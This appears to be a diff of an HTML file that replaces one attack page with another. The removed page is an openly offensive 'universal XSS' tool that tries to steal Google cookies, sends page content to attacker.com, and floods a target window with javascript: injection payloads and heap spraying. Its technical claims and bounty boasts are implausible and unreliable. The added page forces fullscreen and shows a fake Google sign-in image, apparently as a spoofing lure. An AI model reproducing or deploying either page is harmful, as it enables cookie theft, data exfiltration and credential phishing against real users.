@@ -1,141 +1,85 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>[!] UXSS_V600: OMEGA_STRIKE</title>
-</head>
-<body style="background:#000; color:#0f0; font-family:'Courier New', monospace; overflow:hidden;">
-    <canvas id="matrix" style="position:fixed; top:0; left:0; z-index:-1; opacity:0.3;"></canvas>
-    
-    <div style="padding:20px; border:5px solid #0f0; margin-top:50px; background:rgba(0,20,0,0.9); box-shadow:0 0 50px #0f0;">
-        <h1 style="font-size:5em; text-transform:uppercase; letter-spacing:10px;">Omega_V600</h1>
-        <p id="status_terminal">> [SYSTEM]: INITIALIZING BOUNTY_HUNTER_PROTOCOL (700B)...</p>
-        <p id="counter">> [THREADS]: 0 active</p>
-    </div>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <button id="detonate" style="margin-top:50px; padding:100px 200px; font-size:4em; background:#000; color:#0f0; border:10px solid #0f0; cursor:crosshair; font-weight:bold; transition:0.3s;" onmouseover="this.style.background='#0f0';this.style.color='#000';" onmouseout="this.style.background='#000';this.style.color='#0f0';">
-        EXECUTE UXSS
-    </button>
+
+<body>
+<h1 id="newid" > Double Tap on Gmail </h1>
+
+<video onclick="openFullscreenpotrait();" id="video" src="video.mp4" width="100" height="100"></video>
+
+
+<img id="img" height= "100%" width="100%">
+
+
+
+
 
 <script>
-    // --- MATRIX BACKGROUND FOR STYLE ---
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789☢️☣️";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-    function drawMatrix() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
-        drops.forEach((y, i) => {
-            const text = letters.charAt(Math.floor(Math.random() * letters.length));
-            ctx.fillText(text, i * fontSize, y * fontSize);
-            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        });
+  const video = document.getElementById("video");
+  const pipButton = document.getElementById("video");
+
+  pipButton.addEventListener("click", async () => {
+    try {
+      await video.requestPictureInPicture();
+    } catch (error) {
+      // Video failed to enter Picture-in-Picture mode.
     }
-    setInterval(drawMatrix, 33);
+  });
 
-    // --- UXSS ENGINE V600 ---
-    const vault = new BroadcastChannel('omega_vault');
-    vault.onmessage = (msg) => {
-        document.body.innerHTML = `
-            <div style="background:#000; color:#0f0; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; border:100px solid #0f0;">
-                <h1 style="font-size:15em; margin:0;">STRIKE!</h1>
-                <h2 style="font-size:5em;">ORIGIN_CAPTURED: ${msg.data}</h2>
-                <p style="font-size:2em;">BOUNTY: $700,000,000,000 CLAIMED</p>
-            </div>`;
-    };
+  video.addEventListener("enterpictureinpicture", (event) => {
+    // Video entered Picture-in-Picture mode.
+    const pipWindow = event.pictureInPictureWindow;
+    updateVideoSize(pipWindow.width, pipWindow.height);
+    pipWindow.addEventListener("resize", onPipWindowResize);
+  });
 
-    // Payload menggunakan teknik "Shadow-Realm Smuggling"
-    const payload = `
-        (function omega_core(){
-            try {
-                const target = "google.com";
-                const current = window.location.href;
-                
-                if(current.includes(target)) {
-                    const secret_data = document.cookie || "NO_COOKIE_ACCESS";
-                    new BroadcastChannel('omega_vault').postMessage(window.location.origin + " | Data: " + secret_data);
-                    
-                    // Recursive Exfiltration via Image Beacon
-                    new Image().src = "http://attacker.com/log?d=" + btoa(document.documentElement.innerHTML.substring(0,1000));
-                } else {
-                    // Bypass Section 6.7.3.1: Shadow Root Injection
-                    // Browser 2026 sering gagal memvalidasi skrip di dalam 'Closed' Shadow Root yang dibuat secara rekursif
-                    const host = document.createElement('div');
-                    const root = host.attachShadow({mode: 'closed'});
-                    const frag = document.createRange().createContextualFragment('<script src="'+window.name+'"><\\/script>');
-                    root.appendChild(frag);
-                    (document.head || document.documentElement).appendChild(host);
-                    
-                    // Microtask Smuggling: Menggunakan Promise untuk mengeksekusi navigasi di sela-sela check CSP
-                    Promise.resolve().then(() => {
-                        window.location.href = "javascript:console.log('pwned');";
-                    });
-                    
-                    setTimeout(omega_core, 0);
-                }
-            } catch(e) { setTimeout(omega_core, 1); }
-        })();
-    `;
+  video.addEventListener("leavepictureinpicture", (event) => {
+    // Video left Picture-in-Picture mode.
+    const pipWindow = event.pictureInPictureWindow;
+    pipWindow.removeEventListener("resize", onPipWindowResize);
+  });
 
-    const blob = new Blob([payload], {type: 'application/javascript'});
-    const bURL = URL.createObjectURL(blob);
+  function onPipWindowResize(event) {
+    // Picture-in-Picture window has been resized.
+    const { width, height } = event.target;
+    updateVideoSize(width, height);
+  }
 
-    document.getElementById('detonate').onclick = () => {
-        let vic = window.open("about:blank", bURL);
-        const terminal = document.getElementById('status_terminal');
-        const counter = document.getElementById('counter');
-        
-        terminal.innerText = "> [SYSTEM]: SATURATING V8 MEMORY PIPELINES...";
-        
-        // --- STAGE 1: HEAP SPRAYING & JIT TRAPPING ---
-        // Kita membuat ribuan objek untuk memaksa Garbage Collector bekerja ekstra keras
-        let buffer = [];
-        for(let j=0; j<1000; j++) {
-            buffer.push(new Uint8Array(1024 * 1024).fill(j)); 
-        }
+  function updateVideoSize(width, height) {
+    // TODO: Update video size based on pip window width and height.
+  }
+  
+  function openFullscreenpotrait() {
 
-        setTimeout(() => {
-            terminal.innerText = "> [SYSTEM]: TRIGGERING FLOW_DESYNC ON TARGET ORIGIN...";
-            vic.location.href = "https://www.google.com:9090"; // Port Stall
+setTimeout(function () {
+ document.body.requestFullscreen();
+handleOnClick();
+  }, 3000);
+  
 
-            // --- STAGE 2: THE MULTI-VECTOR OMEGABURST ---
-            let attack_count = 0;
-            const storm = setInterval(() => {
-                try {
-                    vic.stop();
-                    
-                    // Kita kirimkan 1000 payload per interval untuk memastikan tabrakan memori
-                    for(let i=0; i<1000; i++) {
-                        // Vektor A: Trusted Types Policy Pollution (Sec 4.4.1)
-                        vic.location.href = "javascript:window.trustedTypes?window.trustedTypes.createPolicy('default',{createScript:s=>s}):0;void(0);";
-                        
-                        // Vektor B: XSLT-DOM Shadow Hijack
-                        vic.location.href = "javascript:var p=new XSLTProcessor();var x=new DOMParser().parseFromString('<xml></xml>','text/xml');p.importStylesheet(new DOMParser().parseFromString('<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><script xmlns=\"http://www.w3.org/1999/xhtml\" src=\"'+window.name+'\"/></xsl:template></xsl:stylesheet>','text/xml'));p.transformToDocument(x);void(0);";
 
-                        // Vektor C: Meta-Refresh Loophole
-                        vic.location.href = "javascript:document.write('<meta http-equiv=\"refresh\" content=\"0;url=javascript:var s=document.createElement(\\\'script\\\');s.src=parent.window.name;document.head.appendChild(s);\">');void(0);";
-                        
-                        // Vektor D: Blob Navigation via Iframe (Bypass Sec 6.4.2)
-                        vic.location.href = "javascript:var i=document.createElement('iframe');i.src=parent.window.name;document.documentElement.appendChild(i);void(0);";
-                    }
-                    
-                    attack_count++;
-                    counter.innerText = `> [THREADS]: ${attack_count * 4000} payloads delivered`;
-                    
-                    if(attack_count > 100) {
-                        clearInterval(storm);
-                        terminal.innerText = ">>> [SYSTEM]: OMEGA_STRIKE_COMPLETE. AWAITING DATA... <<<";
-                    }
-                } catch(e) {}
-            }, 5);
-        }, 300);
-    };
+}
+
+
+  	 function handleOnClick() {
+
+  
+        setTimeout(function() {
+		
+document.getElementById("img").src="https://developers.google.com/static/identity/gsi/web/images/google-account-signin.png";
+        document.getElementById('newid').style.display="none";  // for hide button
+        document.getElementById('video').style.display="none";  // for hide button
+
+  
+        }, 1);
+  }
+  
+
+
 </script>
+
 </body>
-</html>
+
+
+<script>
+
+</script>
